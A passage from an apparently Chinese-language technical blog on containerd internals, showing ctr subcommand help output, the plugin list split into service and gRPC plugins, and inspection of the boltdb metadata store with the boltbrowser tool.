class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># ctr leases -h</span><br>NAME:<br>   ctr leases - Manage leases<br><br>USAGE:<br>   ctr leases <span class="hljs-built_in">command</span> [<span class="hljs-built_in">command</span> options] [arguments...]<br><br>COMMANDS:<br>   list, <span class="hljs-built_in">ls</span>                 List all active leases<br>   create                   Create lease<br>   delete, del, remove, <span class="hljs-built_in">rm</span>  Delete a lease<br><br>OPTIONS:<br>   --<span class="hljs-built_in">help</span>, -h  show <span class="hljs-built_in">help</span><br>   <br></code></pre></td></tr></table></figure><h4 id="namespace"><a href="#namespace" class="headerlink" title="namespace"></a>namespace</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># ctr ns -h</span><br>NAME:<br>   ctr namespaces - Manage namespaces<br><br>USAGE:<br>   ctr namespaces <span class="hljs-built_in">command</span> [<span class="hljs-built_in">command</span> options] [arguments...]<br><br>COMMANDS:<br>   create, c   Create a new namespace<br>   list, <span class="hljs-built_in">ls</span>    List namespaces<br>   remove, <span class="hljs-built_in">rm</span>  Remove one or more namespaces<br>   label       Set and clear labels <span class="hljs-keyword">for</span> a namespace<br><br>OPTIONS:<br>   --<span class="hljs-built_in">help</span>, -h  show <span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># ctr namespace -h</span><br>NAME:<br>   ctr namespaces - Manage namespaces<br><br>USAGE:<br>   ctr namespaces <span class="hljs-built_in">command</span> [<span class="hljs-built_in">command</span> options] [arguments...]<br><br>COMMANDS:<br>   create, c   Create a new namespace<br>   list, <span class="hljs-built_in">ls</span>    List namespaces<br>   remove, <span class="hljs-built_in">rm</span>  Remove one or more namespaces<br>   label       Set and clear labels <span class="hljs-keyword">for</span> a namespace<br><br>OPTIONS:<br>   --<span class="hljs-built_in">help</span>, -h  show <span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><h4 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h4><p>参考：<a href="https://github.com/containerd/containerd/issues/7739">https://github.com/containerd/containerd/issues/7739</a></p><h4 id="snapshot"><a href="#snapshot" class="headerlink" title="snapshot"></a>snapshot</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">NAME:<br>   ctr snapshots - Manage snapshots<br><br>USAGE:<br>   ctr snapshots <span class="hljs-built_in">command</span> [<span class="hljs-built_in">command</span> options] [arguments...]<br><br>COMMANDS:<br>   commit                   Commit an active snapshot into the provided name<br>   diff                     Get the diff of two snapshots. the default second snapshot is the first snapshot<span class="hljs-string">&#x27;s parent.</span><br><span class="hljs-string">   info                     Get info about a snapshot</span><br><span class="hljs-string">   list, ls                 List snapshots</span><br><span class="hljs-string">   mounts, m, mount         Mount gets mount commands for the snapshots</span><br><span class="hljs-string">   prepare                  Prepare a snapshot from a committed snapshot</span><br><span class="hljs-string">   delete, del, remove, rm  Remove snapshots</span><br><span class="hljs-string">   label                    Add labels to content</span><br><span class="hljs-string">   tree                     Display tree view of snapshot branches</span><br><span class="hljs-string">   unpack                   Unpack applies layers from a manifest to a snapshot</span><br><span class="hljs-string">   usage                    Usage snapshots</span><br><span class="hljs-string">   view                     Create a read-only snapshot from a committed snapshot</span><br><span class="hljs-string"></span><br><span class="hljs-string">OPTIONS:</span><br><span class="hljs-string">   --snapshotter value  Snapshotter name. Empty value stands for the default value. [$CONTAINERD_SNAPSHOTTER]</span><br><span class="hljs-string">   --help, -h           show help</span><br></code></pre></td></tr></table></figure><h4 id="task"><a href="#task" class="headerlink" title="task"></a>task</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># ctr t -h</span><br>NAME:<br>   ctr tasks - Manage tasks<br><br>USAGE:<br>   ctr tasks <span class="hljs-built_in">command</span> [<span class="hljs-built_in">command</span> options] [arguments...]<br><br>COMMANDS:<br>   attach                   Attach to the IO of a running container<br>   checkpoint               Checkpoint a container<br>   delete, del, remove, <span class="hljs-built_in">rm</span>  Delete one or more tasks<br>   <span class="hljs-built_in">exec</span>                     Execute additional processes <span class="hljs-keyword">in</span> an existing container<br>   list, <span class="hljs-built_in">ls</span>                 List tasks<br>   <span class="hljs-built_in">kill</span>                     Signal a container (default: SIGTERM)<br>   metrics, metric          Get a single data point of metrics <span class="hljs-keyword">for</span> a task with the built-in Linux runtime<br>   pause                    Pause an existing container<br>   ps                       List processes <span class="hljs-keyword">for</span> container<br>   resume                   Resume a paused container<br>   start                    Start a container that has been created<br><br>OPTIONS:<br>   --<span class="hljs-built_in">help</span>, -h  show <span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># ctr task -h</span><br>NAME:<br>   ctr tasks - Manage tasks<br><br>USAGE:<br>   ctr tasks <span class="hljs-built_in">command</span> [<span class="hljs-built_in">command</span> options] [arguments...]<br><br>COMMANDS:<br>   attach                   Attach to the IO of a running container<br>   checkpoint               Checkpoint a container<br>   delete, del, remove, <span class="hljs-built_in">rm</span>  Delete one or more tasks<br>   <span class="hljs-built_in">exec</span>                     Execute additional processes <span class="hljs-keyword">in</span> an existing container<br>   list, <span class="hljs-built_in">ls</span>                 List tasks<br>   <span class="hljs-built_in">kill</span>                     Signal a container (default: SIGTERM)<br>   metrics, metric          Get a single data point of metrics <span class="hljs-keyword">for</span> a task with the built-in Linux runtime<br>   pause                    Pause an existing container<br>   ps                       List processes <span class="hljs-keyword">for</span> container<br>   resume                   Resume a paused container<br>   start                    Start a container that has been created<br><br>OPTIONS:<br>   --<span class="hljs-built_in">help</span>, -h  show <span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><h4 id="tranfer-amp-streaming"><a href="#tranfer-amp-streaming" class="headerlink" title="tranfer &amp; streaming"></a>tranfer &amp; streaming</h4><p>演进中、</p><h4 id="version"><a href="#version" class="headerlink" title="version"></a>version</h4><p>返回containerd的版本号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># ctr version</span><br>Client:<br>  Version:  v1.7.18<br>  Revision: ae71819c4f5e67bb4d5ae76a6b735f29cc25774e<br>  Go version: go1.21.11<br><br>Server:<br>  Version:  v1.7.18<br>  Revision: ae71819c4f5e67bb4d5ae76a6b735f29cc25774e<br>  UUID: 64bd2d8f-d225-40aa-82fd-874a0a06032b<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># containerd -v</span><br>containerd github.com/containerd/containerd v1.7.18 ae71819c4f5e67bb4d5ae76a6b735f29cc25774e<br></code></pre></td></tr></table></figure><h3 id="7-2-2-Services"><a href="#7-2-2-Services" class="headerlink" title="7.2.2 Services"></a>7.2.2 Services</h3><p>containerd中的Service注册的两种插件如下：</p><ul><li>Service Plugins：即io.containerd.service.v1，用于内部微服务之间相互调用，调用方式为函数调用。</li><li>GRPC Plugins：即io.containerd.grpc.v1，用于对外提供服务，通过grpc服务接口进行调用。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># ctr version</span><br>Client:<br>  Version:  v1.7.18<br>  Revision: ae71819c4f5e67bb4d5ae76a6b735f29cc25774e<br>  Go version: go1.21.11<br><br>Server:<br>  Version:  v1.7.18<br>  Revision: ae71819c4f5e67bb4d5ae76a6b735f29cc25774e<br>  UUID: 64bd2d8f-d225-40aa-82fd-874a0a06032b<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># ctr plugin ls</span><br>TYPE                                   ID                       PLATFORMS      STATUS    <br>io.containerd.snapshotter.v1           aufs                     linux/amd64    skip      <br>io.containerd.event.v1                 exchange                 -              ok        <br>io.containerd.internal.v1              opt                      -              ok        <br>io.containerd.warning.v1               deprecations             -              ok        <br>io.containerd.snapshotter.v1           blockfile                linux/amd64    skip      <br>io.containerd.snapshotter.v1           btrfs                    linux/amd64    skip      <br>io.containerd.snapshotter.v1           devmapper                linux/amd64    error     <br>io.containerd.snapshotter.v1           native                   linux/amd64    ok        <br>io.containerd.snapshotter.v1           overlayfs                linux/amd64    ok        <br>io.containerd.snapshotter.v1           zfs                      linux/amd64    skip      <br>io.containerd.content.v1               content                  -              ok        <br>io.containerd.metadata.v1              bolt                     -              ok        <br>io.containerd.gc.v1                    scheduler                -              ok        <br>io.containerd.differ.v1                walking                  linux/amd64    ok        <br>io.containerd.lease.v1                 manager                  -              ok        <br>io.containerd.streaming.v1             manager                  -              ok        <br>io.containerd.runtime.v1               linux                    linux/amd64    ok        <br>io.containerd.monitor.v1               cgroups                  linux/amd64    ok        <br>io.containerd.runtime.v2               task                     linux/amd64    ok        <br>io.containerd.runtime.v2               shim                     -              ok        <br>io.containerd.sandbox.store.v1         <span class="hljs-built_in">local</span>                    -              ok        <br>io.containerd.sandbox.controller.v1    <span class="hljs-built_in">local</span>                    -              ok        <br>io.containerd.service.v1               containers-service       -              ok        <br>io.containerd.service.v1               content-service          -              ok        <br>io.containerd.service.v1               diff-service             -              ok        <br>io.containerd.service.v1               images-service           -              ok        <br>io.containerd.service.v1               introspection-service    -              ok        <br>io.containerd.service.v1               namespaces-service       -              ok        <br>io.containerd.service.v1               snapshots-service        -              ok        <br>io.containerd.service.v1               tasks-service            -              ok        <br>io.containerd.grpc.v1                  containers               -              ok        <br>io.containerd.grpc.v1                  content                  -              ok        <br>io.containerd.grpc.v1                  diff                     -              ok        <br>io.containerd.grpc.v1                  events                   -              ok        <br>io.containerd.grpc.v1                  images                   -              ok        <br>io.containerd.grpc.v1                  introspection            -              ok        <br>io.containerd.grpc.v1                  leases                   -              ok        <br>io.containerd.grpc.v1                  namespaces               -              ok        <br>io.containerd.grpc.v1                  sandbox-controllers      -              ok        <br>io.containerd.grpc.v1                  sandboxes                -              ok        <br>io.containerd.grpc.v1                  snapshots                -              ok        <br>io.containerd.grpc.v1                  streaming                -              ok        <br>io.containerd.grpc.v1                  tasks                    -              ok        <br>io.containerd.transfer.v1              <span class="hljs-built_in">local</span>                    -              ok        <br>io.containerd.grpc.v1                  transfer                 -              ok        <br>io.containerd.grpc.v1                  version                  -              ok        <br>io.containerd.internal.v1              restart                  -              ok        <br>io.containerd.tracing.processor.v1     otlp                     -              skip      <br>io.containerd.internal.v1              tracing                  -              skip      <br>io.containerd.grpc.v1                  healthcheck              -              ok        <br>io.containerd.nri.v1                   nri                      -              ok        <br>io.containerd.grpc.v1                  cri                      linux/amd64    ok        <br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># ctr plugin ls |grep io.containerd.service.v1</span><br>io.containerd.service.v1               containers-service       -              ok        <br>io.containerd.service.v1               content-service          -              ok        <br>io.containerd.service.v1               diff-service             -              ok        <br>io.containerd.service.v1               images-service           -              ok        <br>io.containerd.service.v1               introspection-service    -              ok        <br>io.containerd.service.v1               namespaces-service       -              ok        <br>io.containerd.service.v1               snapshots-service        -              ok        <br>io.containerd.service.v1               tasks-service            -              ok        <br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># ctr plugin ls |grep io.containerd.grpc.v1</span><br>io.containerd.grpc.v1                  containers               -              ok        <br>io.containerd.grpc.v1                  content                  -              ok        <br>io.containerd.grpc.v1                  diff                     -              ok        <br>io.containerd.grpc.v1                  events                   -              ok        <br>io.containerd.grpc.v1                  images                   -              ok        <br>io.containerd.grpc.v1                  introspection            -              ok        <br>io.containerd.grpc.v1                  leases                   -              ok        <br>io.containerd.grpc.v1                  namespaces               -              ok        <br>io.containerd.grpc.v1                  sandbox-controllers      -              ok        <br>io.containerd.grpc.v1                  sandboxes                -              ok        <br>io.containerd.grpc.v1                  snapshots                -              ok        <br>io.containerd.grpc.v1                  streaming                -              ok        <br>io.containerd.grpc.v1                  tasks                    -              ok        <br>io.containerd.grpc.v1                  transfer                 -              ok        <br>io.containerd.grpc.v1                  version                  -              ok        <br>io.containerd.grpc.v1                  healthcheck              -              ok        <br>io.containerd.grpc.v1                  cri                      linux/amd64    ok   <br></code></pre></td></tr></table></figure><h3 id="7-2-3-Metadata"><a href="#7-2-3-Metadata" class="headerlink" title="7.2.3 Metadata"></a>7.2.3 Metadata</h3><p>Metadata层为数据库层。containerd中的底层元数据的存储采用了boltdb开源数据库。</p><p>metadata在宿主机上保存的路径为 <code>/var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db</code></p><p>containerd中的boltdb schema数据结构可以参考 <a href="https://github.com/containerd/containerd/blob/main/core/metadata/buckets.go">https://github.com/containerd/containerd/blob/main/core/metadata/buckets.go</a></p><p>boltbrowser是一款开源的boltdb数据库浏览器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># git clone https://github.com/br0xen/boltbrowser.git</span><br>Cloning into <span class="hljs-string">&#x27;boltbrowser&#x27;</span>...<br>remote: Enumerating objects: 678, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (58/58), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (37/37), <span class="hljs-keyword">done</span>.<br>remote: Total 678 (delta 29), reused 42 (delta 21), pack-reused 620<br>Receiving objects: 100% (678/678), 2.68 MiB | 6.01 MiB/s, <span class="hljs-keyword">done</span>.<br>Resolving deltas: 100% (326/326), <span class="hljs-keyword">done</span>.<br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># cd boltbrowser/</span><br>[root@ubuntu-22 boltbrowser]<span class="hljs-comment"># </span><br>[root@ubuntu-22 boltbrowser]<span class="hljs-comment"># go build</span><br>go: downloading github.com/br0xen/termbox-util v0.0.0-20170904143325-de1d4c83380e<br>go: downloading github.com/nsf/termbox-go v1.1.1<br>go: downloading go.etcd.io/bbolt v1.3.7<br>go: downloading github.com/mattn/go-runewidth v0.0.9<br>go: downloading golang.org/x/sys v0.8.0<br>[root@ubuntu-22 boltbrowser]<span class="hljs-comment"># </span><br>[root@ubuntu-22 boltbrowser]<span class="hljs-comment"># </span><br>[root@ubuntu-22 boltbrowser]<span class="hljs-comment"># ll /var/lib/containerd/io.containerd.metadata.v1.bolt/</span><br>total 196<br>drwx--x--x  2 root root   4096  4月 13 08:13 ./<br>drwx--x--x 12 root root   4096  7月  8 20:07 ../<br>-rw-r--r--  1 root root 262144  7月 24 21:25 meta.db<br>[root@ubuntu-22 boltbrowser]<span class="hljs-comment"># </span><br>[root@ubuntu-22 boltbrowser]<span class="hljs-comment"># boltbrowser /var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db </span><br>boltbrowser: <span class="hljs-built_in">command</span> not found<br>[root@ubuntu-22 boltbrowser]<span class="hljs-comment"># </span><br>[root@ubuntu-22 boltbrowser]<span class="hljs-comment"># ls</span><br>boltbrowser    build      go.mod  LICENSE  mainloop.go          README.md        screen_browser.go  stringify.go<br>bolt_model.go  cursor.go  go.sum  main.go  mainloop_windows.go  screen_about.go  screen.go          style.go<br>[root@ubuntu-22 boltbrowser]<span class="hljs-comment"># </span><br>[root@ubuntu-22 boltbrowser]<span class="hljs-comment"># ./boltbrowser /var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db </span><br>File /var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db is locked. Make sure it<span class="hljs-string">&#x27;s not used by another app and try again</span><br><span class="hljs-string">[root@ubuntu-22 boltbrowser]# </span><br><span class="hljs-string">[root@ubuntu-22 boltbrowser]# </span><br><span class="hljs-string">[root@ubuntu-22 boltbrowser]# </span><br><span class="hljs-string">[root@ubuntu-22 boltbrowser]# </span><br><span class="hljs-string">[root@ubuntu-22 boltbrowser]# systemctl stop contaienrd</span><br><span class="hljs-string">Failed to stop contaienrd.service: Unit contaienrd.service not loaded.</span><br><span class="hljs-string">[root@ubuntu-22 boltbrowser]# </span><br><span class="hljs-string">[root@ubuntu-22 boltbrowser]# </span><br><span class="hljs-string">[root@ubuntu-22 boltbrowser]# systemctl stop containerd</span><br><span class="hljs-string">[root@ubuntu-22 boltbrowser]# </span><br><span class="hljs-string">[root@ubuntu-22 boltbrowser]# </span><br><span class="hljs-string">[root@ubuntu-22 boltbrowser]# ./boltbrowser /var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db </span><br><span class="hljs-string">                                                           boltbrowser: /var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db                                                          </span><br><span class="hljs-string">==============================================================================================|=============================================================================================</span><br><span class="hljs-string">  - v1                                                                                        | Path: v1 → moby → content → blob → sha256:073c978f17eedaee7fb0d36636e1baa2ffdb6a2b5af2e458c9</span><br><span class="hljs-string">    - moby                                                                                    | Buckets: 1                                                                                  </span><br><span class="hljs-string">      - containers                                                                            | Pairs: 3                                                                                    </span><br><span class="hljs-string">        - 42caca363f947a391bb6a3606cfd29a1fe59ed9b90ad043d8b4e8c5c0a7cf2f9                    |                                                                                             </span><br><span class="hljs-string">          - labels                                                                            |                                                                                             </span><br><span class="hljs-string">            com.docker/engine.bundle.path: /var/run/docker/containerd/42caca363f947a391bb6a360|                                                                                             </span><br><span class="hljs-string">          - runtime                                                                           |                                                                                             </span><br><span class="hljs-string">            name: io.containerd.runc.v2                                                       |                                                                                             </span><br><span class="hljs-string">            options: 0a1a636f6e7461696e6572642e72756e632e76312e4f7074696f6e731226320472756e633|                                                                                             </span><br><span class="hljs-string">          createdat: 010000000ede1dc4b4310e554fffff                                           |                                                                                             </span><br><span class="hljs-string">          image:                                                                              |                                                                                             </span><br><span class="hljs-string">          snapshotKey:                                                                        |                                                                                             </span><br><span class="hljs-string">          snapshotter:                                                                        |                                                                                             </span><br><span class="hljs-string">          spec: 0a3674797065732e636f6e7461696e6572642e696f2f6f70656e636f6e7461696e6572732f7275|                                                                                             </span><br><span class="hljs-string">          updatedat: 010000000ede1dc4b4310e554fffff                                           |                                                                                             </span><br><span class="hljs-string">      - content                                                                               |                                                                                             </span><br><span class="hljs-string">        - blob                                                                                |                                                                                             </span><br><span class="hljs-string">          - sha256:03b30c6a3c320ff172b52bd68eddffde6ded08ce47e650fe52de861c5e9df46d           |                                                                                             </span><br><span class="hljs-string">            - labels                                                                          |                                                                                             </span><br><span class="hljs-string">              containerd.io/distribution.source.docker.io: library/hello-world                |                                                                                             </span><br><span class="hljs-string">            createdat: 010000000eddabc5443894fe6cffff                                         |                                                                                             </span><br><span class="hljs-string">            size: 84a001                                                                      |                                                                                             </span><br><span class="hljs-string">            updatedat: 010000000eddabc5443894fe6cffff                                         |                                                                                             </span><br><span class="hljs-string">          + sha256:073c978f17eedaee7fb0d36636e1baa2ffdb6a2b5af2e458c9612a85ad06ea5d           |                                                                                             </span><br><span class="hljs-string">          + sha256:16edc9559472f368b71e0f19a575e71080f2251f6693e7d560e21cc6472f7da6           |                                                                                             </span><br><span class="hljs-string">          + sha256:33c69a810cc314b55c9e1e218ab9eb1b39034b28b023234854f093a207a87154           |                                                                                             </span><br><span class="hljs-string">          + sha256:74f634b1bc1bd74535d5209589734efbd44a25f4e2dc96d78784576a3eb5b335           |                                                                                             </span><br><span class="hljs-string">          + sha256:796dd77ab5223837579b323c961197514e9b5e37e99babbf51f9bb2ba1dbdcc8           |                                                                                             </span><br><span class="hljs-string">          + sha256:8b08414b805beb7a1440493aa6e8cecd4729c536e8f9adc2d26514051bc31422           |                                                                                             </span><br><span class="hljs-string">          + sha256:e2fc4e5012d16e7fe466f5291c476431beaa1f9b90a5c2125b493ed28e2aba57           |                                                                                             </span><br><span class="hljs-string">          + sha256:e31c3b1cd47718260e1b6163af0a05b3c428dc01fa410baf72ca8b8076e22e72           |                                                                                             </span><br><span class="hljs-string">          + sha256:ee08ce572c81dd90a3fbb7e2f4e660a5224924efd2649fb717460659b080c41b           |                                                                                             </span><br><span class="hljs-string">          + sha256:efaa0224e7c87b2dbf8b4f0fee2bd595764adf6065a6bff6fffe833057237f64           |                                                                                             </span><br><span class="hljs-string">          + sha256:fb9c9aef62af3955f6014613456551c92e88a67dcf1fc51f5f91bcbd1832813f           |                                                                                             </span><br><span class="hljs-string">        - ingests                                                                             |                                                                                             </span><br><span class="hljs-string">      - leases                                                                                |                                                                                             </span><br><span class="hljs-string">        - moby-image-sha256:1052b284c2aa9cd4f832e76eddcba9738d7dca63a3358766e3cf0a408df4e13e  |                                                                                             </span><br><span class="hljs-string">          - content                                                                           |                                                                                             </span><br><span class="hljs-string">            sha256:efaa0224e7c87b2dbf8b4f0fee2bd595764adf6065a6bff6fffe833057237f64:          |                                                                                             </span><br><span class="hljs-string">          createdat: 010000000ede0382f628cfc681ffff                                           |                                                                                             </span><br><span class="hljs-string">        + moby-image-sha256:49b3cb3043cd00b3911213a837d1559638376017483d2d4b9761ed12e50f4f3e  |                                                                                             </span><br><span class="hljs-string">        + moby-image-sha256:86eb87ff06b5a99af56ba09c36f9f06d904cc9f467e61a2a4befdfd2e5c50a3d  |                                                                                             </span><br><span class="hljs-string">        + moby-image-sha256:8c811b4aec35f259572d0f79207bc0678df4c736eeec50bc9fec37ed936a472a  |                                                                                             </span><br><span class="hljs-string">        + moby-image-sha256:9363667f8aecb904d1f10cef4ca936f6507d25f0a50b103b55f78d336dbabe57  |                                                                                             </span><br><span class="hljs-string">        + moby-image-sha256:97f5c5e8b918580066d433f26987c2e8f7348572ec8b85957784ab80471bcb68  |                                                                                             </span><br><span class="hljs-string">        + moby-image-sha256:c80088f20cce4fd7f029dacea2e273e720f3e0d7a5a90b6cfb99d7290ea18537  |                                                                                             </span><br><span class="hljs-string">        + moby-image-sha256:d2c94e258dcb3c5ac2798d32e1249e42ef01cba4841c2234249495f87264ac5a  |                                                                                             </span><br><span class="hljs-string">    version: 06                                                                               |                                                                                             </span><br><span class="hljs-string">                                                                                              |                                                                                             </span><br><span class="hljs-string">                                                                                              |                                                                                             </span><br><span class="hljs-string">                          